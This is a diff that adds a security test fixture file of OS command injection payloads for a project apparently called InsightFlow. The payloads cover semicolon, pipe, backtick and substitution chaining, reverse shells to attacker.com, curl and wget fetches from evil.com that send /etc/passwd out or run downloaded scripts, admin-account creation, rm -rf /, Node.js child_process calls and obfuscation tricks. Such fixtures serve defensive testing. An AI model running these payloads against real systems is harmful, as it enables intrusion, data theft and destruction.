@@ -1,0 +1,93 @@
+# OS Command Injection Payloads - InsightFlow Security Test Fixtures
+# Format: one payload per line, # for comments
+
+# Semicolon chaining
+; ls
+; whoami
+; id
+; pwd
+; cat /etc/passwd
+; cat /etc/shadow
+; env
+; printenv
+; dir
+; type C:\Windows\win.ini
+; netstat -an
+; ifconfig
+; ipconfig
+; systeminfo
+
+# Pipe injection
+| ls
+| whoami
+| cat /etc/passwd
+| dir
+| type C:\Windows\win.ini
+| net user
+| nc -e /bin/sh attacker.com 4444
+| nc -e cmd.exe attacker.com 4444
+
+# Backtick substitution
+`ls`
+`whoami`
+`cat /etc/passwd`
+`id`
+`dir`
+`echo hacked`
+
+# Dollar sign substitution
+$(cat /etc/passwd)
+$(whoami)
+$(id)
+$(ls -la)
+$(nc -e /bin/sh 10.0.0.1 4444)
+$(curl http://evil.com/steal?data=$(cat /etc/passwd))
+
+# Newline injection
+directory\nwhoami
+path\ncat /etc/passwd
+file\nid
+
+# Ampersand backgrounding
+& whoami &
+& ping -c 10 10.0.0.1 &
+& nc -e /bin/sh attacker.com 4444 &
+
+# Combined injection
+; rm -rf / ; echo hacked
+; wget http://evil.com/malware.sh -O /tmp/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh
+$(curl -s http://evil.com/revshell.sh | bash)
+`curl http://evil.com/revshell.sh | sh`
+
+# Windows-specific
+| dir C:\
+| type C:\Windows\System32\drivers\etc\hosts
+| net user /add hacker Password123!
+| net localgroup Administrators hacker /add
+| powershell -Command Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
+| cmd /c "echo hacked"
+& rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";alert(1)&
+
+# Node.js-specific injection
+__proto__.polluted=true
+constructor.constructor('return process')().env
+require('child_process').execSync('whoami')
+process.mainModule.require('child_process').execSync('id')
+
+# Multi-command chaining
+original && whoami
+original || whoami
+original | whoami
+original ; whoami ; echo done
+original & whoami &
+original $(id)
+original `id`
+
+# Obfuscation
+/???/c$?t /e???/p??sw??
+c$?t /e???/p??sw??
+${PATH:0:1}etc${PATH:0:1}passwd
+cat${IFS}/etc${IFS}/passwd
+who$@ami
+who{}$ami
+who$0ami
